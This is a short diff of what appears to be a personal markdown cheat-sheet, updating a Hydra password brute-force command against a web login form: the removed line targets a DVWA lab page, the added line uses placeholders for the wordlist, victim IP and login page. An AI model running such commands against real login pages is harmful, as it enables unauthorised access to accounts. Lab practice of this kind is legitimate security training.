@@ -25,8 +25,10 @@ git push
 
 ## Hydra Basic Stuff
 
+### HTTP
+
 ```bash
-hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+hydra -l admin -P <Pathtodesiredwordlist> <VictimIP> http-post-form "<LoginPage>:username=^USER^&password=^PASS^&Login=Login:Access Denied" -V
 ```
 -l indicates a single username (use -L for a username list)  
 -P indicates use the following password list  
